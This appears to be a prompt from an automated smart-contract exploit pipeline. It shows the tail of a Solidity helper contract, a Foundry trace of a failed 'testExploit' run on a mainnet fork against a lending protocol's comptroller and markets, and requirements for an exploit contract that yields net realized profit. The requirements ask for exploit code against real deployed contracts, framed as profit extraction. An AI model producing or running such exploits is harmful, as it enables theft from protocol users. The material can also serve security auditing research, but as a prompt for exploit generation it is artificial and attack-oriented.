        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve-failed");
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}

```

forge stdout (tail):
```
9B9c9Cd3B
    │   ├─ [3176] 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B::mintGuardianPaused(0xC11b1268C1A384e55C48c2391d8d480264A3A7F4) [staticcall]
    │   │   ├─ [2505] 0xBafE01ff935C7305907c33BF824352eE5979B526::mintGuardianPaused(0xC11b1268C1A384e55C48c2391d8d480264A3A7F4) [delegatecall]
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   ├─ [2013] 0x50ce56A3239671Ab62f185704Caedf626352741e::getTokenConfig(18) [staticcall]
    │   │   └─ ← [Return] 0x041171993284df560249B57358F931D9eB7b925D, 0x8E870D67F660D95d5be530380D0eC0bd388289E1, 0xe6ce7ecb96a43fc15fb4020f93c37885612803dd74366bb6815e4f607ac3ca20, 1000000000000000000 [1e18], 1, 1000000 [1e6], 0x0000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, 1, false
    │   ├─ [449] 0x041171993284df560249B57358F931D9eB7b925D::comptroller() [staticcall]
    │   │   └─ ← [Return] 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B
    │   ├─ [1118] 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B::oracle() [staticcall]
    │   │   ├─ [450] 0xBafE01ff935C7305907c33BF824352eE5979B526::oracle() [delegatecall]
    │   │   │   └─ ← [Return] 0x50ce56A3239671Ab62f185704Caedf626352741e
    │   │   └─ ← [Return] 0x50ce56A3239671Ab62f185704Caedf626352741e
    │   ├─ [1505] 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B::markets(0x041171993284df560249B57358F931D9eB7b925D) [staticcall]
    │   │   ├─ [810] 0xBafE01ff935C7305907c33BF824352eE5979B526::markets(0x041171993284df560249B57358F931D9eB7b925D) [delegatecall]
    │   │   │   └─ ← [Return] true, 0, false
    │   │   └─ ← [Return] true, 0, false
    │   ├─ [449] 0x041171993284df560249B57358F931D9eB7b925D::comptroller() [staticcall]
    │   │   └─ ← [Return] 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B
    │   ├─ [3176] 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B::mintGuardianPaused(0x041171993284df560249B57358F931D9eB7b925D) [staticcall]
    │   │   ├─ [2505] 0xBafE01ff935C7305907c33BF824352eE5979B526::mintGuardianPaused(0x041171993284df560249B57358F931D9eB7b925D) [delegatecall]
    │   │   │   └─ ← [Return] false
    │   │   └─ ← [Return] false
    │   ├─ [1505] 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B::markets(0x041171993284df560249B57358F931D9eB7b925D) [staticcall]
    │   │   ├─ [810] 0xBafE01ff935C7305907c33BF824352eE5979B526::markets(0x041171993284df560249B57358F931D9eB7b925D) [delegatecall]
    │   │   │   └─ ← [Return] true, 0, false
    │   │   └─ ← [Return] true, 0, false
    │   ├─ [2039] 0x50ce56A3239671Ab62f185704Caedf626352741e::getTokenConfig(19) [staticcall]
    │   │   └─ ← [Return] 0x7713DD9Ca933848F6819F38B8352D9A15EA73F67, 0x956F47F50A910163D8BF957Cf5846D573E7f87CA, 0x58c46f3a00a69ae5a5ce163895c14f8f5b7791333af9fe6e7a73618cb5460913, 1000000000000000000 [1e18], 2, 0, 0x2028D7Ef0223C45caDBF05E13F1823c1228012BF, 0xDe2Fa230d4C05ec0337D7b4fc10e16f5663044B0, 10000000000000000 [1e16], false
    │   ├─ [449] 0x7713DD9Ca933848F6819F38B8352D9A15EA73F67::comptroller() [staticcall]
    │   │   └─ ← [Return] 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B
    │   ├─ [1118] 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B::oracle() [staticcall]
    │   │   ├─ [450] 0xBafE01ff935C7305907c33BF824352eE5979B526::oracle() [delegatecall]
    │   │   │   └─ ← [Return] 0x50ce56A3239671Ab62f185704Caedf626352741e
    │   │   └─ ← [Return] 0x50ce56A3239671Ab62f185704Caedf626352741e
    │   ├─ [1505] 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B::markets(0x7713DD9Ca933848F6819F38B8352D9A15EA73F67) [staticcall]
    │   │   ├─ [810] 0xBafE01ff935C7305907c33BF824352eE5979B526::markets(0x7713DD9Ca933848F6819F38B8352D9A15EA73F67) [delegatecall]
    │   │   │   └─ ← [Return] true, 0, false
    │   │   └─ ← [Return] true, 0, false
    │   ├─ [449] 0x7713DD9Ca933848F6819F38B8352D9A15EA73F67::comptroller() [staticcall]
    │   │   └─ ← [Return] 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B
    │   ├─ [3176] 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B::mintGuardianPaused(0x7713DD9Ca933848F6819F38B8352D9A15EA73F67) [staticcall]
    │   │   ├─ [2505] 0xBafE01ff935C7305907c33BF824352eE5979B526::mintGuardianPaused(0x7713DD9Ca933848F6819F38B8352D9A15EA73F67) [delegatecall]
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   └─ ← [Return]
    ├─ [391] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [414] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 19290920 [1.929e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3124)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 25.06s (25.04s CPU time)

Ran 1 test suite in 25.07s (25.06s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 1181526)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
